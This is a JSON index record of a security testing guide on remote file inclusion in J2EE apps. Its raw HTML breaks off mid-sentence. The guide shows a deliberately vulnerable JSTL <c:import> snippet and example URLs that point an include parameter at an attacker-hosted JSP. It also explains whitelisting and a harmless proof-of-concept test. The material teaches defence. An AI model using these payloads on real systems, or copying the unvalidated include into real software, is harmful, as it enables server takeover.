{
  "id": "fd3ecaaa-cb7c-43a2-a91a-f19862f736d4",
  "checksum": "098c38bbdafca26ff422d39d281dad7219c7a9dd",
  "words": {
    "1": [
      "ul",
      "li",
      "h1"
    ],
    "2": [
      "ul",
      "li",
      "h1",
      "ol",
      "li"
    ],
    "3": [
      "ul",
      "li",
      "h1"
    ],
    "applies": [
      "h1"
    ],
    "to": [
      "h1",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "title"
    ],
    "j2ee": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "p",
      "p"
    ],
    "applications": [
      "ul",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "summary": [
      "h1"
    ],
    "are": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "hosted": [
      "p",
      "ol",
      "li"
    ],
    "by": [
      "p",
      "p",
      "p",
      "p"
    ],
    "a": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p"
    ],
    "web": [
      "p",
      "p",
      "p",
      "p"
    ],
    "server": [
      "p",
      "p"
    ],
    "capable": [
      "p"
    ],
    "of": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p"
    ],
    "interpreting": [
      "p"
    ],
    "and": [
      "p",
      "p",
      "p",
      "ul",
      "li",
      "p",
      "p",
      "ol",
      "li",
      "h1",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "executing": [
      "p"
    ],
    "server-side": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "p",
      "p",
      "title"
    ],
    "code": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "p",
      "title"
    ],
    "such": [
      "p",
      "p",
      "p",
      "p"
    ],
    "as": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p"
    ],
    "java": [
      "p",
      "p",
      "p",
      "title"
    ],
    "pages": [
      "p",
      "p"
    ],
    "jsp": [
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "files": [
      "p",
      "p"
    ],
    "or": [
      "p",
      "p"
    ],
    "servlets": [
      "p"
    ],
    "injection": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "p",
      "p",
      "title"
    ],
    "bug": [
      "p",
      "p",
      "p",
      "p"
    ],
    "occurs": [
      "p",
      "p"
    ],
    "when": [
      "p",
      "p",
      "p"
    ],
    "an": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "attacker": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "is": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "font",
      "p",
      "p",
      "i",
      "p",
      "p"
    ],
    "able": [
      "p",
      "p"
    ],
    "inject": [
      "p",
      "p",
      "p"
    ],
    "additional": [
      "p",
      "p"
    ],
    "that": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p"
    ],
    "then": [
      "p",
      "p"
    ],
    "interpreted": [
      "p"
    ],
    "executed": [
      "p",
      "p",
      "p"
    ],
    "part": [
      "p",
      "p",
      "p"
    ],
    "the": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li",
      "li",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "applicationâ€™s": [
      "p",
      "p",
      "p",
      "p"
    ],
    "for": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "p",
      "p",
      "title"
    ],
    "instance": [
      "p"
    ],
    "remotely": [
      "p",
      "p",
      "p"
    ],
    "includes": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "malicious": [
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "page": [
      "p",
      "p",
      "p",
      "p"
    ],
    "in": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "h2",
      "em",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "title"
    ],
    "application": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "i",
      "p",
      "p",
      "p",
      "p"
    ],
    "since": [
      "p"
    ],
    "it": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "has": [
      "p"
    ],
    "programmatic": [
      "p"
    ],
    "access": [
      "p"
    ],
    "different": [
      "p"
    ],
    "resources": [
      "p"
    ],
    "including": [
      "p",
      "p"
    ],
    "user": [
      "p"
    ],
    "accounts": [
      "p"
    ],
    "databases": [
      "p"
    ],
    "attackers": [
      "p",
      "p",
      "p"
    ],
    "can": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "exploit": [
      "p",
      "p"
    ],
    "bugs": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "execute": [
      "p",
      "ul",
      "li",
      "p",
      "p",
      "h1",
      "p",
      "p"
    ],
    "logical": [
      "p",
      "p"
    ],
    "attacks": [
      "p",
      "p",
      "p",
      "p"
    ],
    "on": [
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "follow": [
      "p",
      "p"
    ],
    "these": [
      "p",
      "p"
    ],
    "steps": [
      "p",
      "p"
    ],
    "test": [
      "p",
      "ul",
      "li",
      "p",
      "p",
      "h1",
      "p",
      "h2",
      "em",
      "ol",
      "li",
      "p",
      "p",
      "title"
    ],
    "step": [
      "ul",
      "ul",
      "ul",
      "li",
      "li",
      "li",
      "h1",
      "p",
      "h1",
      "p",
      "h1",
      "ol",
      "li"
    ],
    "understand": [
      "ul",
      "li",
      "h1",
      "p",
      "p",
      "p",
      "p"
    ],
    "attack": [
      "ul",
      "li",
      "h1",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "scenarios": [
      "ul",
      "li",
      "h1"
    ],
    "analyze": [
      "ul",
      "li",
      "h1"
    ],
    "causes": [
      "ul",
      "li",
      "h1",
      "p"
    ],
    "countermeasures": [
      "ul",
      "li",
      "h1"
    ],
    "cases": [
      "ul",
      "li",
      "h1",
      "p"
    ],
    "first": [
      "p"
    ],
    "learning": [
      "p",
      "p"
    ],
    "how": [
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "title"
    ],
    "anatomy": [
      "p"
    ],
    "vulnerability": [
      "p",
      "p"
    ],
    "important": [
      "p"
    ],
    "difference": [
      "p"
    ],
    "between": [
      "p"
    ],
    "client-side": [
      "p",
      "p",
      "p"
    ],
    "uses": [
      "p",
      "p",
      "p",
      "p"
    ],
    "vulnerable": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "i",
      "p"
    ],
    "remote": [
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "clientâ€™s": [
      "p",
      "p"
    ],
    "browser": [
      "p",
      "p"
    ],
    "context": [
      "p"
    ],
    "this": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "why": [
      "p"
    ],
    "cross-site": [
      "p"
    ],
    "scripting": [
      "p"
    ],
    "xss)": [
      "p"
    ],
    "well": [
      "p",
      "p"
    ],
    "ajax": [
      "p"
    ],
    "written": [
      "p"
    ],
    "javascript": [
      "p"
    ],
    "victim": [
      "p"
    ],
    "must": [
      "p",
      "p",
      "p",
      "p"
    ],
    "be": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "interpret": [
      "p",
      "p"
    ],
    "aims": [
      "p"
    ],
    "at": [
      "p",
      "ol",
      "li"
    ],
    "having": [
      "p"
    ],
    "engine": [
      "p",
      "p"
    ],
    "asp": [
      "p"
    ],
    "etc)": [
      "p"
    ],
    "means": [
      "p"
    ],
    "who": [
      "p"
    ],
    "successfully": [
      "p"
    ],
    "exploits": [
      "p"
    ],
    "will": [
      "p",
      "p"
    ],
    "add": [
      "p"
    ],
    "extra": [
      "p"
    ],
    "functionality": [
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "executes": [
      "p",
      "p"
    ],
    "with": [
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "same": [
      "p"
    ],
    "privileges": [
      "p"
    ],
    "include": [
      "p",
      "p",
      "p",
      "p"
    ],
    "source": [
      "p",
      "p",
      "p"
    ],
    "containing": [
      "p",
      "ol",
      "li"
    ],
    "scripts": [
      "p"
    ],
    "might": [
      "p",
      "p"
    ],
    "which": [
      "p"
    ],
    "also": [
      "p",
      "p",
      "p"
    ],
    "known": [
      "p"
    ],
    "file": [
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "ol",
      "li",
      "li",
      "li"
    ],
    "inclusion": [
      "p",
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li"
    ],
    "rfi)": [
      "p",
      "p"
    ],
    "consider": [
      "p",
      "p"
    ],
    "url": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "li",
      "p"
    ],
    "parameter": [
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "from": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "trusted": [
      "p"
    ],
    "site": [
      "p",
      "ol",
      "li",
      "ol",
      "li"
    ],
    "http//some_site/example.jsp?includefile=http://trusted_site/remote.jsp": [
      "pre"
    ],
    "http//trusted_site/remote.jsp": [
      "strong"
    ],
    "allows": [
      "p"
    ],
    "tamper": [
      "p"
    ],
    "order": [
      "p"
    ],
    "http//some_site/example.jsp?includefile=http://attacker_site/attack.jsp": [
      "pre"
    ],
    "detail": [
      "p"
    ],
    "discovers": [
      "ol",
      "li"
    ],
    "where": [
      "ol",
      "li"
    ],
    "client": [
      "ol",
      "li",
      "ol",
      "ol",
      "li",
      "li"
    ],
    "supplied": [
      "ol",
      "li",
      "ol",
      "li"
    ],
    "input": [
      "ol",
      "li",
      "p",
      "p",
      "p",
      "p",
      "p",
      "ol",
      "ol",
      "li",
      "li",
      "p"
    ],
    "used": [
      "ol",
      "li",
      "p"
    ],
    "filename": [
      "ol",
      "li"
    ],
    "passes": [
      "ol",
      "li"
    ],
    "name": [
      "ol",
      "li"
    ],
    "attacker-controlled": [
      "ol",
      "li"
    ],
    "second": [
      "p"
    ],
    "what": [
      "p"
    ],
    "protect": [
      "p",
      "p",
      "p"
    ],
    "against": [
      "p",
      "p",
      "p",
      "p"
    ],
    "possible": [
      "p",
      "p",
      "p"
    ],
    "due": [
      "p"
    ],
    "improper": [
      "p"
    ],
    "rfi).": [
      "p"
    ],
    "even": [
      "p"
    ],
    "though": [
      "p"
    ],
    "vulnerabilities": [
      "p",
      "p"
    ],
    "commonly": [
      "p"
    ],
    "associated": [
      "p"
    ],
    "php": [
      "p"
    ],
    "rfi": [
      "p",
      "p"
    ],
    "caused": [
      "p"
    ],
    "because": [
      "p"
    ],
    "fails": [
      "p"
    ],
    "properly": [
      "p",
      "p"
    ],
    "sanitize": [
      "p"
    ],
    "validate": [
      "p",
      "p"
    ],
    "client-supplied": [
      "p"
    ],
    "note": [
      "p"
    ],
    "use": [
      "p",
      "p",
      "p",
      "p",
      "p",
      "p"
    ],
    "include>": [
      "p",
      "em"
    ],
    "jsp:include>": [
      "p",
      "em"
    ],
    "tags": [
      "p"
    ],
    "only": [
      "p"
    ],
    "allow": [
      "p",
      "p"
    ],
    "relative": [
      "p"
    ],
    "paths": [
      "p"
    ],
    "so": [
      "p"
    ],
    "impossible": [
      "p"
    ],
    "making": [
      "p"
    ],
    "them": [
      "p"
    ],
    "safe": [
      "p"
    ],
    "variation": [
      "p"
    ],
    "however": [
      "p"
    ],
    "standard": [
      "p"
    ],
    "tag": [
      "p",
      "p",
      "p"
    ],
    "libraryâ€™s": [
      "p"
    ],
    "jstl)": [
      "p"
    ],
    "c:import>": [
      "p",
      "em",
      "p",
      "em"
    ],
    "%@": [
      "pre"
    ],
    "taglib": [
      "pre"
    ],
    "prefix=\"c\"": [
      "pre"
    ],
    "uri=\"http//java.sun.com/jstl/core\"": [
      "pre"
    ],
    "%\r\n<c:catch": [
      "pre"
    ],
    "var=\"ex\"\r\n<c:import": [
      "pre"
    ],
    "url=\"%=": [
      "pre"
    ],
    "requestgetparameter(\\\"sourcefile\\\")": [
      "pre"
    ],
    "%\"/>\r\n</c:catch>\r\n<c:if": [
      "pre"
    ],
    "test=\"${not": [
      "pre"
    ],
    "empty": [
      "pre"
    ],
    "ex}\"": [
      "pre"
    ],
    "\r\nerror:": [
      "pre"
    ],
    "c:out": [
      "pre"
    ],
    "value=\"message\"": [
      "pre"
    ],
    "/\r\n</c:if>": [
      "pre"
    ],
    "above": [
      "p",
      "p",
      "ol",
      "li"
    ],
    "specified": [
      "p"
    ],
    "sourcefile": [
      "p",
      "p",
      "em",
      "em",
      "strong"
    ],
    "but": [
      "p"
    ],
    "directly": [
      "p"
    ],
    "without": [
      "p"
    ],
    "proper": [
      "p"
    ],
    "validation": [
      "p"
    ],
    "result": [
      "p"
    ],
    "through": [
      "p"
    ],
    "http//some_site/example.jsp?sourcefile=http://attacker_site/attack.jsp": [
      "pre"
    ],
    "depending": [
      "p"
    ],
    "platform": [
      "p"
    ],
    "may": [
      "p"
    ],
    "methods": [
      "p"
    ],
    "jstl": [
      "p"
    ],
    "example": [
      "p"
    ],
    "should": [
      "p"
    ],
    "hide": [
      "p"
    ],
    "their": [
      "p"
    ],
    "being": [
      "p"
    ],
    "accessed": [
      "p"
    ],
    "outside": [
      "p"
    ],
    "clients": [
      "p"
    ],
    "if": [
      "p",
      "p",
      "p"
    ],
    "they": [
      "p",
      "p"
    ],
    "accessible": [
      "p"
    ],
    "during": [
      "p",
      "p"
    ],
    "i.e.": [
      "p"
    ],
    "parameters,": [
      "p"
    ],
    "sure": [
      "p"
    ],
    "any": [
      "p",
      "p"
    ],
    "parameters": [
      "p",
      "p"
    ],
    "before": [
      "p"
    ],
    "developers": [
      "p"
    ],
    "recommended": [
      "p"
    ],
    "create": [
      "p",
      "ol",
      "li"
    ],
    "whitelistcontaining": [
      "p"
    ],
    "list": [
      "p",
      "p"
    ],
    "valid": [
      "p"
    ],
    "locations": [
      "p"
    ],
    "implemented": [
      "p"
    ],
    "regular": [
      "p"
    ],
    "expression.": [
      "p"
    ],
    "check": [
      "p",
      "p"
    ],
    "all": [
      "p"
    ],
    "appear": [
      "p"
    ],
    "white": [
      "p"
    ],
    "reject": [
      "p"
    ],
    "not": [
      "p"
    ],
    "white-listed": [
      "p"
    ],
    "now": [
      "p"
    ],
    "youâ€™ve": [
      "p"
    ],
    "reviewed": [
      "p"
    ],
    "theoretical": [
      "p"
    ],
    "aspects": [
      "p"
    ],
    "necessary": [
      "p",
      "p",
      "p"
    ],
    "your": [
      "p"
    ],
    "proof-of-concept": [
      "ol",
      "li",
      "p"
    ],
    "testjsp": [
      "ol",
      "li",
      "i"
    ],
    "following": [
      "ol",
      "li"
    ],
    "jsp:text>application": [
      "ol",
      "li",
      "font"
    ],
    "vulnerable/jsp:text>": [
      "ol",
      "li",
      "font"
    ],
    "host": [
      "ol",
      "li"
    ],
    "domain": [
      "ol",
      "li"
    ],
    "http//test_site/test.jsp": [
      "ol",
      "li",
      "font"
    ],
    "discover": [
      "ol",
      "li"
    ],
    "performs": [
      "ol",
      "li"
    ],
    "based": [
      "ol",
      "li"
    ],
    "pass": [
      "ol",
      "li"
    ],
    "observe": [
      "ol",
      "li"
    ],
    "reacts": [
      "ol",
      "li",
      "p"
    ],
    "injected": [
      "ol",
      "li"
    ],
    "expected": [
      "p"
    ],
    "results": [
      "p"
    ],
    "displays": [
      "p"
    ],
    "message": [
      "p"
    ],
    "conclusions": [
      "h1"
    ],
    "hosts": [
      "p"
    ],
    "target": [
      "p"
    ],
    "learn": [
      "p"
    ],
    "its": [
      "p"
    ],
    "scenario": [
      "p"
    ],
    "testing": [
      "p"
    ],
    "requires": [
      "p"
    ],
    "building": [
      "p"
    ],
    "small": [
      "p"
    ],
    "hosting": [
      "p"
    ],
    "location": [
      "p"
    ],
    "passing": [
      "p"
    ],
    "under": [
      "p"
    ],
    "while": [
      "p"
    ],
    "observing": [
      "p"
    ]
  },
  "tags": {
    "h1": [
      "Applies to",
      "Summary",
      "Step 1: Understand attack scenarios",
      "Step 2: Analyze Causes and Countermeasures",
      "Step 3: Execute Test Cases",
      "Conclusions"
    ],
    "ul": [
      "J2EE applications",
      "Step 1: Understand attack scenarios \r\n    Step 2: Analyze causes and countermeasures \r\n    Step 3: Execute test cases"
    ],
    "li": [
      "J2EE applications",
      "Step 1: Understand attack scenarios",
      "Step 2: Analyze causes and countermeasures",
      "Step 3: Execute test cases",
      "The attacker discovers an application functionality where client supplied input is used as a filename of a remote file inclusion.",
      "The attacker passes the name of a remote file, hosted at an attacker-controlled site, and containing malicious code.",
      "Create a proof-of-concept JSP file test.jsp  with the following code: <jsp:text>Application is vulnerable</jsp:text>",
      "Host the JSP file above in a test site domain: http://test_site/test.jsp",
      "Discover a functionality in the application that performs remote file inclusion based on client supplied input.",
      "Pass the URL from Step 2 as client input.",
      "Observe how the application reacts to the injected code."
    ],
    "b": [
      ""
    ],
    "p": [
      "J2EE applications are hosted by a Web server capable of interpreting and executing server-side code such as Java Server Pages (JSP files) or Java servlets. A server-side code injection bug occurs when an attacker is able to inject additional server-side code that is then interpreted and executed as part of the applicationâ€™s code; for instance, when an attacker remotely includes a malicious JSP page in a J2EE application. Since the server-side code is executed as part of the application, it has programmatic access to different application resources including user accounts and databases. Attackers can exploit server-side code injection bugs to execute logical attacks on J2EE applications.",
      "Follow these steps to test for server-side code injection in J2EE applications:",
      "The first step in learning how to test for server-side code injection bugs is to understand the anatomy of a server-side code injection vulnerability in J2EE.",
      "It is important to understand the difference between client-side code injection and server-side code injection:",
      "Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the clientâ€™s browser context. This is why client-side code injection attacks such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim clientâ€™s browser must be able to interpret the exploit code.",
      "Server-side code injection aims at having the applicationâ€™s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application. This means that an attacker who successfully exploits a server-side code injection bug will add an extra application functionality that executes with the same privileges of the applicationâ€™s code.",
      "J2EE web applications that remotely include source code files, such as JSP pages containing server-side scripts, might be vulnerable to this attack which is also known as Remote File Inclusion (RFI) attack. Consider an application that uses a URL parameter to include a remote file from a trusted site:",
      "A vulnerable J2EE application allows an attacker to tamper with the URL parameter in order to remotely include a malicious source code file:",
      "In detail:",
      "The second step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.",
      "Server-side code injection in J2EE applications is possible due to improper Remote File Inclusion (RFI).  Even though server-side code injection and Remote File Inclusion (RFI) vulnerabilities are commonly associated with PHP applications, J2EE applications might be also vulnerable to this attack. RFI vulnerabilities are caused because the applicationâ€™s code fails to properly sanitize and validate client-supplied input and uses it in a remote file inclusion.",
      "Note that J2EE applications that use the <include> or <jsp:include> tags only allow for relative paths so including a remote file is impossible, making them safe against this variation. However, J2EE applications can use the Java Standard Tag Libraryâ€™s (JSTL) <c:import> tag to include a remote source code file. Consider this code:",
      "The code above includes a remote file specified by the sourceFile URL parameter, but it directly uses the input in the <c:import> tag without proper input validation. As a result, an attacker can inject malicious server-side code to the application through the sourceFile URL parameter:",
      "Depending on the platform in use, it may be possible to use additional RFI methods to the JSTL example above.",
      "To protect against this bug, J2EE applications should hide their remote file includes from being accessed by outside clients. If they must use accessible input during remote includes (i.e. URL parameters), they must be sure to properly validate any parameters before during remote file inclusion. Developers are recommended to create a whitelistcontaining a list of the valid remote locations (that can be also implemented as a regular expression). The application must then check that all parameters used in the inclusion appear in the white list and reject any input parameter that is not white-listed.",
      "Now that youâ€™ve reviewed the theoretical aspects of server-side code injection bugs in J2EE it is necessary to execute the necessary test cases to check if your application is vulnerable.",
      "Follow these steps:",
      "Expected results: The application is vulnerable if it includes and executes the JSP page and displays the message Application is vulnerable.",
      "Server-side code injection bugs allow attackers to inject code that will be executed by the J2EE engine that hosts the vulnerable application. Attackers can use server-side code injection to execute logical attacks on the target application. To learn how to test for this vulnerability, it is necessary to understand its attack scenario and how it is possible in J2EE applications, as well as how to protect against it. Testing for this bug requires building a small proof-of-concept page, hosting it in a remote location, and passing a URL to the page as input to the application under test while observing how the application reacts."
    ],
    "pre": [
      "http://some_site/example.jsp?includeFile=http://trusted_site/remote.jsp",
      "http://some_site/example.jsp?includeFile=http://attacker_site/attack.jsp",
      "<%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jstl/core\" %>\r\n<c:catch var=\"ex\">\r\n<c:import url=\"<%= request.getParameter(\\\"sourceFile\\\") %>\"/>\r\n</c:catch>\r\n<c:if test=\"${not empty ex}\" >\r\nError: <c:out value=\"message\" />\r\n</c:if>",
      "http://some_site/example.jsp?sourceFile=http://attacker_site/attack.jsp"
    ],
    "strong": [
      "http://trusted_site/remote.jsp",
      "sourceFile"
    ],
    "i": [
      "",
      "test.jsp",
      "Application is vulnerable."
    ],
    "ol": [
      "The attacker discovers an application functionality where client supplied input is used as a filename of a remote file inclusion. \r\n    The attacker passes the name of a remote file, hosted at an attacker-controlled site, and containing malicious code.",
      "Create a proof-of-concept JSP file test.jsp  with the following code: <jsp:text>Application is vulnerable</jsp:text>\r\n    Host the JSP file above in a test site domain: http://test_site/test.jsp\r\n    Discover a functionality in the application that performs remote file inclusion based on client supplied input. \r\n    Pass the URL from Step 2 as client input. \r\n    Observe how the application reacts to the injected code."
    ],
    "em": [
      "<include>",
      "<jsp:include>",
      "<c:import>",
      "sourceFile",
      "<c:import>",
      "sourceFile",
      "",
      "Test for Server-side code injection in J2EE"
    ],
    "h2": [
      "Test for Server-side code injection in J2EE"
    ],
    "font": [
      "<jsp:text>Application is vulnerable</jsp:text>",
      "http://test_site/test.jsp"
    ]
  },
  "links": [],
  "html": "<h1>Applies to</h1>\r\n  <ul>\r\n    <li>J2EE applications<b></b></li>\r\n  </ul>\r\n  <h1>Summary</h1>\r\n  <p>J2EE applications are hosted by a Web server capable of interpreting and executing server-side code such as Java Server Pages (JSP files) or Java servlets. A server-side code injection bug occurs when an attacker is able to inject additional server-side code that is then interpreted and executed as part of the applicationâ€™s code; for instance, when an attacker remotely includes a malicious JSP page in a J2EE application. Since the server-side code is executed as part of the application, it has programmatic access to different application resources including user accounts and databases. Attackers can exploit server-side code injection bugs to execute logical attacks on J2EE applications.</p>\r\n  <p>Follow these steps to test for server-side code injection in J2EE applications:</p>\r\n  <ul>\r\n    <li>Step 1: Understand attack scenarios </li>\r\n    <li>Step 2: Analyze causes and countermeasures </li>\r\n    <li>Step 3: Execute test cases</li>\r\n  </ul>\r\n  <h1>Step 1: Understand attack scenarios</h1>\r\n  <p>The first step in learning how to test for server-side code injection bugs is to understand the anatomy of a server-side code injection vulnerability in J2EE.</p>\r\n  <p>It is important to understand the difference between client-side code injection and server-side code injection:</p>\r\n  <p>Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the clientâ€™s browser context. This is why client-side code injection attacks such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim clientâ€™s browser must be able to interpret the exploit code.</p>\r\n  <p>Server-side code injection aims at having the applicationâ€™s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application. This means that an attacker who successfully exploits a server-side code injection bug will add an extra application functionality that executes with the same privileges of the applicationâ€™s code.   </p>\r\n  <p>J2EE web applications that remotely include source code files, such as JSP pages containing server-side scripts, might be vulnerable to this attack which is also known as Remote File Inclusion (RFI) attack. Consider an application that uses a URL parameter to include a remote file from a trusted site:</p>\r\n  <pre>http://some_site/example.jsp?includeFile=<strong>http://trusted_site/remote.jsp</strong></pre>\r\n  <p>A vulnerable J2EE application allows an attacker to tamper with the URL parameter in order to remotely include a malicious source code file:<i></i></p>\r\n  <pre>http://some_site/example.jsp?includeFile=http://attacker_site/attack.jsp</pre>\r\n  <p>In detail:</p>\r\n  <ol>\r\n    <li>The attacker discovers an application functionality where client supplied input is used as a filename of a remote file inclusion. </li>\r\n    <li>The attacker passes the name of a remote file, hosted at an attacker-controlled site, and containing malicious code.</li>\r\n  </ol>\r\n  <h1>Step 2: Analyze Causes and Countermeasures</h1>\r\n  <p>The second step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.  </p>\r\n  <p>Server-side code injection in J2EE applications is possible due to improper Remote File Inclusion (RFI).  Even though server-side code injection and Remote File Inclusion (RFI) vulnerabilities are commonly associated with PHP applications, J2EE applications might be also vulnerable to this attack. RFI vulnerabilities are caused because the applicationâ€™s code fails to properly sanitize and validate client-supplied input and uses it in a remote file inclusion.  </p>\r\n  <p>Note that J2EE applications that use the <em>&lt;include&gt;</em> or <em>&lt;jsp:include&gt;</em> tags only allow for relative paths so including a remote file is impossible, making them safe against this variation. However, J2EE applications can use the Java Standard Tag Libraryâ€™s (JSTL) <em>&lt;c:import&gt;</em> tag to include a remote source code file. Consider this code:</p>\r\n  <pre>&lt;%@ taglib prefix=\"c\" uri=\"http://java.sun.com/jstl/core\" %&gt;\r\n&lt;c:catch var=\"ex\"&gt;\r\n&lt;c:import url=\"&lt;%= request.getParameter(\\\"sourceFile\\\") %&gt;\"/&gt;\r\n&lt;/c:catch&gt;\r\n&lt;c:if test=\"${not empty ex}\" &gt;\r\nError: &lt;c:out value=\"message\" /&gt;\r\n&lt;/c:if&gt;</pre>\r\n  <p>The code above includes a remote file specified by the <em>sourceFile</em> URL parameter, but it directly uses the input in the <em>&lt;c:import&gt; </em>tag without proper input validation. As a result, an attacker can inject malicious server-side code to the application through the <em>sourceFile</em> URL parameter:</p>\r\n  <pre>http://some_site/example.jsp?<strong>sourceFile</strong>=http://attacker_site/attack.jsp</pre>\r\n  <p>Depending on the platform in use, it may be possible to use additional RFI methods to the JSTL example above. </p>\r\n  <p>To protect against this bug, J2EE applications should hide their remote file includes from being accessed by outside clients. If they must use accessible input during remote includes (i.e. URL parameters), they must be sure to properly validate any parameters before during remote file inclusion. Developers are recommended to create a whitelist<em></em>containing a list of the valid remote locations (that can be also implemented as a regular expression). The application must then check that all parameters used in the inclusion appear in the white list and reject any input parameter that is not white-listed.</p>\r\n  <h1>Step 3: Execute Test Cases</h1>\r\n  <p>Now that youâ€™ve reviewed the theoretical aspects of server-side code injection bugs in J2EE it is necessary to execute the necessary test cases to check if your application is vulnerable.</p>\r\n  <h2>\r\n    <em>Test for Server-side code injection in J2EE</em>\r\n  </h2>\r\n  <p>Follow these steps:</p>\r\n  <ol>\r\n    <li>Create a proof-of-concept JSP file <i>test.jsp</i>  with the following code: <font face=\"Courier New\">&lt;jsp:text&gt;Application is vulnerable&lt;/jsp:text&gt;</font></li>\r\n    <li>Host the JSP file above in a test site domain: <font face=\"Courier New\">http://test_site/test.jsp</font></li>\r\n    <li>Discover a functionality in the application that performs remote file inclusion based on client supplied input. </li>\r\n    <li>Pass the URL from Step 2 as client input. </li>\r\n    <li>Observe how the application reacts to the injected 